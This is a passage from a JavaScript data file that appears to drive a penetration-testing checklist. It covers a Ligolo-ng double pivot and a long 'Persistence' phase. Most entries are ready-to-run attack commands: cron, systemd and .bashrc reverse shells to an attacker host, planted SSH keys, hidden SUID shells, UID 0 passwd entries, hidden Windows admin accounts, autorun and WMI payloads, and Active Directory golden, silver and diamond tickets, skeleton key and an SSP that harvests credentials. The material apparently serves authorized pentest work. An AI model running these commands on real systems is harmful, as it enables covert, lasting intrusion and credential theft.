                    "socat - OPENSSL:<TARGET-IP>:<PORT>,verify=0"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-69",
          "name": "Double Pivot Scenario (Ligolo-ng)",
          "description": "Scenario: You’ve compromised Host A (DMZ) which can reach Host B (internal). Host B can reach Host C (deeper internal). You need to access Host C from your Kali machine.",
          "commands": [
            {
              "desc": "Step-by-Step",
              "entries": [
                {
                  "cmd": [
                    "# === SETUP (Kali) ===",
                    "# Start Ligolo-ng proxy (already covered in main section)",
                    "sudo ip tuntap add user $(whoami) mode tun ligolo",
                    "sudo ip link set ligolo up",
                    "./proxy -selfcert -laddr 0.0.0.0:11601",
                    "",
                    "# === FIRST PIVOT (Host A → Internal Network) ===",
                    "# On Host A: run agent connecting back to Kali",
                    "./agent -connect <KALI-IP>:11601 -ignore-cert",
                    "",
                    "# On Kali proxy: select the agent session",
                    "session",
                    "# Select Host A's session",
                    "",
                    "# Add route to Host B's network",
                    "sudo ip route add <HOST-B-SUBNET>/24 dev ligolo",
                    "",
                    "# Start the tunnel",
                    "start",
                    "",
                    "# === SECOND PIVOT (Host B → Deeper Network) ===",
                    "# First, set up a listener on the first tunnel to relay agent connections",
                    "# In Ligolo-ng proxy:",
                    "listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11601 --tcp",
                    "",
                    "# On Host B: run agent connecting through Host A",
                    "./agent -connect <HOST-A-IP>:11602 -ignore-cert",
                    "",
                    "# On Kali proxy: select Host B's new session",
                    "session",
                    "# Select Host B's session",
                    "",
                    "# Add route to Host C's network via ligolo interface",
                    "sudo ip route add <HOST-C-SUBNET>/24 dev ligolo",
                    "",
                    "# Start the second tunnel",
                    "start",
                    "",
                    "# Now you can access Host C directly from Kali!",
                    "nmap -sC -sV <HOST-C-IP>"
                  ]
                }
              ]
            }
          ]
        }
    ]
  },
  /* ─── Phase 6: Persistence ────────────────────────────── */
  {
    "id": "persistence",
    "name": "Persistence",
    "optional": true,
    "items": [
      {
        "id": "persist-1",
        "name": "Linux: SSH Key Persistence",
        "description": "Add attacker SSH key to authorized_keys for persistent passwordless access.",
        "commands": [
          {
            "desc": "Generate and plant SSH key",
            "entries": [
              {
                "subdesc": "On attacker — generate key pair",
                "cmd": [
                  "ssh-keygen -t rsa -b 4096 -f /tmp/backdoor_key -N ''"
                ]
              },
              {
                "subdesc": "On target — add public key",
                "cmd": [
                  "mkdir -p /root/.ssh",
                  "echo '<contents of backdoor_key.pub>' >> /root/.ssh/authorized_keys",
                  "chmod 600 /root/.ssh/authorized_keys"
                ]
              },
              {
                "subdesc": "Connect",
                "cmd": [
                  "ssh -i /tmp/backdoor_key root@<TARGET>"
                ]
              }
            ]
          },
          {
            "desc": "Multiple user persistence",
            "entries": [
              {
                "subdesc": "Plant keys in all user home directories",
                "cmd": [
                  "for user in $(ls /home); do mkdir -p /home/$user/.ssh; echo '<pubkey>' >> /home/$user/.ssh/authorized_keys; done"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "persist-2",
        "name": "Linux: Cron Job Backdoor",
        "description": "Create recurring reverse shell callback via cron job. Survives reboots.",
        "commands": [
          {
            "desc": "User crontab backdoor",
            "entries": [
              {
                "subdesc": "Reverse shell every minute",
                "cmd": [
                  "(crontab -l 2>/dev/null; echo '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"') | crontab -"
                ]
              }
            ]
          },
          {
            "desc": "System crontab backdoor",
            "entries": [
              {
                "subdesc": "Add to /etc/crontab",
                "cmd": [
                  "echo '* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"' >> /etc/crontab"
                ]
              },
              {
                "subdesc": "Alternatively, drop script in cron.d",
                "cmd": [
                  "echo '* * * * * root /tmp/.backdoor.sh' > /etc/cron.d/sysupdate"
                ]
              }
            ]
          },
          {
            "desc": "Verify persistence",
            "entries": [
              {
                "subdesc": "Confirm cron jobs are active and will survive reboot",
                "cmd": [
                  "crontab -l",
                  "cat /etc/crontab",
                  "ls -la /etc/cron.d/"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "persist-3",
        "name": "Linux: SUID Backdoor",
        "description": "Create SUID copy of bash or custom binary for instant root escalation.",
        "commands": [
          {
            "desc": "SUID bash copy",
            "entries": [
              {
                "subdesc": "Create SUID copy",
                "cmd": [
                  "cp /bin/bash /tmp/.hidden_shell",
                  "chmod u+s /tmp/.hidden_shell"
                ]
              },
              {
                "subdesc": "Trigger",
                "cmd": [
                  "/tmp/.hidden_shell -p"
                ]
              }
            ]
          },
          {
            "desc": "Hidden SUID in legitimate directory",
            "entries": [
              {
                "subdesc": "Create hidden SUID binary",
                "cmd": [
                  "cp /bin/bash /usr/local/bin/.update-helper",
                  "chmod 4755 /usr/local/bin/.update-helper"
                ]
              },
              {
                "subdesc": "Trigger",
                "cmd": [
                  "/usr/local/bin/.update-helper -p"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "persist-4",
        "name": "Linux: Systemd Service Backdoor",
        "description": "Create a systemd service that starts on boot and maintains persistent callback.",
        "commands": [
          {
            "desc": "Create malicious service",
            "entries": [
              {
                "subdesc": "Create service file",
                "cmd": [
                  "cat > /etc/systemd/system/sysupdate.service << 'EOF'\n[Unit]\nDescription=System Update Service\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'\nRestart=always\nRestartSec=60\n\n[Install]\nWantedBy=multi-user.target\nEOF"
                ]
              },
              {
                "subdesc": "Enable and start",
                "cmd": [
                  "systemctl daemon-reload",
                  "systemctl enable sysupdate.service",
                  "systemctl start sysupdate.service"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "persist-5",
        "name": "Linux: Bashrc/Profile Backdoor",
        "description": "Inject commands into shell initialization files — executes every time user logs in or opens terminal.",
        "commands": [
          {
            "desc": ".bashrc backdoor",
            "entries": [
              {
                "subdesc": "Triggers on every new bash session",
                "cmd": [
                  "echo 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1 &' >> /root/.bashrc",
                  "echo 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1 &' >> /home/<user>/.bashrc"
                ]
              }
            ]
          },
          {
            "desc": ".profile / .bash_profile backdoor",
            "entries": [
              {
                "subdesc": "Triggers on login shells only",
                "cmd": [
                  "echo 'nohup bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\" &' >> /root/.profile"
                ]
              }
            ]
          },
          {
            "desc": "Add user to sudoers",
            "entries": [
              {
                "subdesc": "Direct append",
                "cmd": [
                  "echo '<username> ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"
                ]
              },
              {
                "subdesc": "Via sudoers.d",
                "cmd": [
                  "echo '<username> ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/<username>"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "persist-6",
        "name": "Linux: PAM & Login Backdoor",
        "description": "Backdoor PAM for universal password acceptance or inject into login mechanisms.",
        "commands": [
          {
            "desc": "PAM backdoor (advanced)",
            "entries": [
              {
                "subdesc": "Modify PAM module to accept a hardcoded password for any user",
                "cmd": [
                  "# Modify pam_unix.so source to accept backdoor password",
                  "# Compile modified pam_unix.so and replace original",
                  "# Backup original: cp /lib/x86_64-linux-gnu/security/pam_unix.so /tmp/.pam_unix.so.bak"
                ]
              }
            ]
          },
          {
            "desc": "Add root user to /etc/passwd",
            "entries": [
              {
                "subdesc": "Create new user with UID 0 (root)",
                "cmd": [
                  "openssl passwd -1 -salt xyz password123",
                  "echo 'backdoor:$1$xyz$<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "persist-7",
        "name": "Windows: Registry Run Key",
        "description": "Add registry autorun entry — payload executes every time the user logs in.",
        "commands": [
          {
            "desc": "Current user (HKCU)",
            "entries": [
              {
                "subdesc": "Registry (reg add)",
                "cmd": [
                  "reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Updater /t REG_SZ /d \"C:\\Temp\\shell.exe\" /f"
                ]
              },
              {
                "subdesc": "PowerShell alternative",
                "cmd": [
                  "Set-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'Updater' -Value 'C:\\Temp\\shell.exe'"
                ]
              }
            ]
          },
          {
            "desc": "All users (HKLM)",
            "entries": [
              {
                "subdesc": "Requires admin — runs for any user logon",
                "cmd": [
                  "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Updater /t REG_SZ /d \"C:\\Temp\\shell.exe\" /f"
                ]
              }
            ]
          },
          {
            "desc": "Other autorun locations",
            "entries": [
              {
                "subdesc": "Less monitored registry keys",
                "cmd": [
                  "reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v Updater /t REG_SZ /d \"C:\\Temp\\shell.exe\" /f",
                  "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit /t REG_SZ /d \"C:\\Windows\\system32\\userinit.exe,C:\\Temp\\shell.exe\" /f"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "persist-8",
        "name": "Windows: Scheduled Task Persistence",
        "description": "Create scheduled task for recurring payload execution. Runs as SYSTEM if admin.",
        "commands": [
          {
            "desc": "SYSTEM scheduled task",
            "entries": [
              {
                "subdesc": "Runs every 5 minutes as SYSTEM",
                "cmd": [
                  "schtasks /create /tn \"SystemUpdate\" /tr \"C:\\Temp\\shell.exe\" /sc minute /mo 5 /ru SYSTEM /f"
                ]
              },
              {
                "subdesc": "On logon trigger",
                "cmd": [
                  "schtasks /create /tn \"WindowsUpdate\" /tr \"C:\\Temp\\shell.exe\" /sc onlogon /ru SYSTEM /f"
                ]
              }
            ]
          },
          {
            "desc": "User-level scheduled task",
            "entries": [
              {
                "subdesc": "Basic (schtasks)",
                "cmd": [
                  "schtasks /create /tn \"Updater\" /tr \"C:\\Temp\\shell.exe\" /sc minute /mo 5 /f"
                ]
              },
              {
                "subdesc": "PowerShell",
                "cmd": [
                  "$action = New-ScheduledTaskAction -Execute 'C:\\Temp\\shell.exe'",
                  "$trigger = New-ScheduledTaskTrigger -AtLogon",
                  "Register-ScheduledTask -Action $action -Trigger $trigger -TaskName 'Updater' -Description 'System Update'"
                ]
              }
            ]
          },
          {
            "desc": "Verify",
            "entries": [
              {
                "subdesc": "Confirm scheduled task is registered and running on schedule",
                "cmd": [
                  "schtasks /query /tn \"SystemUpdate\" /fo LIST /v"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "persist-9",
        "name": "Windows: New Admin User",
        "description": "Create persistent privileged local account. Quick but noisy — easily detected.",
        "commands": [
          {
            "desc": "Create local admin",
            "entries": [
              {
                "subdesc": "Add user and grant admin + RDP",
                "cmd": [
                  "net user hacker Password123! /add",
                  "net localgroup Administrators hacker /add",
                  "net localgroup \"Remote Desktop Users\" hacker /add"
                ]
              }
            ]
          },
          {
            "desc": "Hide user from login screen",
            "entries": [
              {
                "subdesc": "Prevent user from showing on Windows login UI",
                "cmd": [
                  "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v hacker /t REG_DWORD /d 0 /f"
                ]
              }
            ]
          },
          {
            "desc": "Enable RDP (if disabled)",
            "entries": [
              {
                "subdesc": "Enable Remote Desktop and allow through firewall",
                "cmd": [
                  "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
                  "netsh advfirewall firewall set rule group=\"remote desktop\" new enable=yes"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "persist-10",
        "name": "Windows: Service Creation",
        "description": "Create a Windows service that runs payload as SYSTEM on boot.",
        "commands": [
          {
            "desc": "Create persistent service",
            "entries": [
              {
                "subdesc": "Create and start",
                "cmd": [
                  "sc create SysUpdate binpath= \"C:\\Temp\\shell.exe\" start= auto obj= LocalSystem",
                  "sc start SysUpdate"
                ]
              },
              {
                "subdesc": "Add description to blend in",
                "cmd": [
                  "sc description SysUpdate \"Windows System Update Service\""
                ]
              }
            ]
          },
          {
            "desc": "Modify existing service",
            "entries": [
              {
                "subdesc": "Hijack a disabled/stopped service binary path",
                "cmd": [
                  "sc config <stopped_service> binpath= \"C:\\Temp\\shell.exe\"",
                  "sc config <stopped_service> start= auto",
                  "sc start <stopped_service>"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "persist-11",
        "name": "Windows: WMI Event Subscription",
        "description": "Fileless persistence using WMI event triggers. Survives reboots, hard to detect.",
        "commands": [
          {
            "desc": "WMI event subscription",
            "entries": [
              {
                "subdesc": "Create WMI event filter (triggers on boot)",
                "cmd": [
                  "$filterArgs = @{name='Updater'; EventNameSpace='root\\CimV2'; QueryLanguage='WQL'; Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"}",
                  "$filter = Set-WmiInstance -Class __EventFilter -Namespace 'root\\subscription' -Arguments $filterArgs"
                ]
              },
              {
                "subdesc": "Create consumer (action)",
                "cmd": [
                  "$consumerArgs = @{name='Updater'; CommandLineTemplate='C:\\Temp\\shell.exe'}",
                  "$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace 'root\\subscription' -Arguments $consumerArgs"
                ]
              },
              {
                "subdesc": "Bind filter to consumer",
                "cmd": [
                  "$bindingArgs = @{Filter=$filter; Consumer=$consumer}",
                  "Set-WmiInstance -Class __FilterToConsumerBinding -Namespace 'root\\subscription' -Arguments $bindingArgs"
                ]
              }
            ]
          },
          {
            "desc": "Detect / cleanup WMI persistence",
            "entries": [
              {
                "subdesc": "Enumerate WMI event subscriptions to verify or remove persistence",
                "cmd": [
                  "Get-WmiObject -Namespace root\\subscription -Class __EventFilter",
                  "Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer",
                  "Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "persist-12",
        "name": "Windows: Startup Folder",
        "description": "Drop payload in Startup folder — executes on user logon. Simple but effective.",
        "commands": [
          {
            "desc": "Current user startup",
            "entries": [
              {
                "subdesc": "Only runs when specific user logs in",
                "cmd": [
                  "copy C:\\Temp\\shell.exe \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\updater.exe\""
                ]
              }
            ]
          },
          {
            "desc": "All users startup",
            "entries": [
              {
                "subdesc": "Requires admin — runs for any user logon",
                "cmd": [
                  "copy C:\\Temp\\shell.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\updater.exe\""
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "persist-13",
        "name": "AD: Golden Ticket",
        "description": "Forge TGT with krbtgt hash — complete domain access that survives password resets (except krbtgt reset).",
        "commands": [
          {
            "desc": "Extract krbtgt hash",
            "entries": [
              {
                "subdesc": "DCSync for krbtgt",
                "cmd": [
                  "mimikatz # lsadump::dcsync /user:krbtgt",
                  "secretsdump.py <domain>/<admin>:<pass>@<dc_ip> -just-dc-user krbtgt"
                ]
              }
            ]
          },
          {
            "desc": "Forge golden ticket",
            "entries": [
              {
                "subdesc": "With mimikatz",
                "cmd": [
                  "mimikatz # kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /krbtgt:<krbtgt_hash> /ptt"
                ]
              },
              {
                "subdesc": "With impacket",
                "cmd": [
                  "ticketer.py -nthash <krbtgt_hash> -domain-sid <domain_sid> -domain <domain> Administrator",
                  "export KRB5CCNAME=Administrator.ccache",
                  "psexec.py <domain>/Administrator@<dc> -k -no-pass"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "persist-14",
        "name": "AD: Silver Ticket",
        "description": "Forge TGS for specific service using service account hash — more targeted and stealthy than golden ticket.",
        "commands": [
          {
            "desc": "Forge silver ticket",
            "entries": [
              {
                "subdesc": "Target specific service",
                "cmd": [
                  "mimikatz # kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /target:<target_server> /service:cifs /rc4:<service_account_hash> /ptt"
                ]
              },
              {
                "subdesc": "Common service SPNs",
                "cmd": [
                  "# cifs (SMB), http (web), mssql, ldap, host"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "persist-15",
        "name": "AD: Diamond & Sapphire Tickets",
        "description": "Modern ticket attacks that modify legitimate TGTs — harder to detect than golden tickets.",
        "commands": [
          {
            "desc": "Diamond ticket (Rubeus)",
            "entries": [
              {
                "subdesc": "Modify real TGT instead of forging from scratch — evades golden ticket detections",
                "cmd": [
                  "Rubeus.exe diamond /krbkey:<aes256_krbtgt_key> /user:<user> /password:<pass> /enctype:aes /domain:<domain> /dc:<dc> /ticketuser:Administrator /ticketuserid:500 /groups:512 /ptt"
                ]
              }
            ]
          },
          {
            "desc": "Sapphire ticket (Rubeus)",
            "entries": [
              {
                "subdesc": "Uses S4U2self + U2U to get legitimate PAC — most stealthy Kerberos persistence",
                "cmd": [
                  "Rubeus.exe diamond /krbkey:<aes256_krbtgt_key> /user:<user> /password:<pass> /enctype:aes /domain:<domain> /dc:<dc> /ticketuser:Administrator /ticketuserid:500 /groups:512 /tgtdeleg /ptt"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "persist-16",
        "name": "AD: DSRM & Skeleton Key",
        "description": "Domain Controller persistence mechanisms — DSRM password abuse and in-memory skeleton key.",
        "commands": [
          {
            "desc": "DSRM persistence",
            "entries": [
              {
                "subdesc": "Dump DSRM password (on DC)",
                "cmd": [
                  "mimikatz # token::elevate",
                  "mimikatz # lsadump::sam"
                ]
              },
              {
                "subdesc": "Enable network DSRM logon",
                "cmd": [
                  "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f"
                ]
              },
              {
                "subdesc": "Login with DSRM creds",
                "cmd": [
                  "# Use Administrator hash with /domain:dc-hostname"
                ]
              }
            ]
          },
          {
            "desc": "Skeleton key",
            "entries": [
              {
                "subdesc": "Patch LSASS in memory",
                "cmd": [
                  "mimikatz # privilege::debug",
                  "mimikatz # misc::skeleton"
                ]
              },
              {
                "subdesc": "Login as any user",
                "cmd": [
                  "# Password for any account: mimikatz (lost on reboot)"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "persist-17",
        "name": "AD: Golden Certificate & Custom SSP",
        "description": "ADCS certificate persistence and custom Security Support Provider for credential harvesting.",
        "commands": [
          {
            "desc": "Golden certificate",
            "entries": [
              {
                "subdesc": "Extract CA certificate & key",
                "cmd": [
                  "certipy ca -ca '<ca_name>' -backup -u <admin>@<domain> -p <pass> -dc-ip <dc_ip>"
                ]
              },
              {
                "subdesc": "Forge certificate for Administrator",
                "cmd": [
                  "certipy forge -ca-pfx ca.pfx -upn Administrator@<domain> -subject 'CN=Administrator'"
                ]
              },
              {
                "subdesc": "Authenticate with forged cert",
                "cmd": [
                  "certipy auth -pfx administrator_forged.pfx -dc-ip <dc_ip>"
                ]
              }
            ]
          },
          {
            "desc": "Custom SSP",
            "entries": [
              {
                "subdesc": "Copy mimilib.dll to System32",
                "cmd": [
                  "# Copy mimilib.dll to C:\\Windows\\System32"
                ]
              },
              {
                "subdesc": "Register SSP",
                "cmd": [
                  "mimikatz # misc::memssp"
                ]
              },
              {
                "subdesc": "Credentials logged to",
                "cmd": [
                  "# C:\\Windows\\System32\\kiwissp.log"
                ]
              },
              {
                "subdesc": "Persistent across reboots (registry)",
                "cmd": [
                  "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"Security Packages\" /t REG_MULTI_SZ /d \"kerberos\\0msv1_0\\0schannel\\0wdigest\\0tspkg\\0pku2u\\0mimilib\" /f"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "persist-18",
        "name": "AD: AdminSDHolder & SID History",
        "description": "Stealthy AD persistence via protected object abuse and SID history injection.",
        "commands": [
          {
            "desc": "AdminSDHolder abuse",
            "entries": [
              {
                "subdesc": "Grant user Full Control on AdminSDHolder",
                "cmd": [
                  "Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=<domain>' -PrincipalIdentity <user> -Rights All -Verbose"
                ]
              },
              {
                "subdesc": "After SDProp runs (~60 min)",
                "cmd": [
                  "# User has Full Control on Domain Admins, Enterprise Admins, etc.",
                  "# Force SDProp: Invoke-SDPropagator -ShowProgress"
                ]
              }
            ]
          },
          {
            "desc": "SID History injection",
            "entries": [
              {
                "subdesc": "Add DA SID with mimikatz",
                "cmd": [
                  "mimikatz # sid::patch",
                  "mimikatz # sid::add /sam:<target_user> /new:<domain_admin_sid>"
                ]
              },
              {
                "subdesc": "Alternatively with PowerView",
                "cmd": [
                  "Set-DomainObject -Identity <user> -Set @{'SIDHistory'='<DA_SID>'}"
                ]
              }
            ]
          }
        ]
      }
    ]
  }
];

/* Normalise all command arrays into strings on load */
normalizeChecklistPhases(checklistPhases);
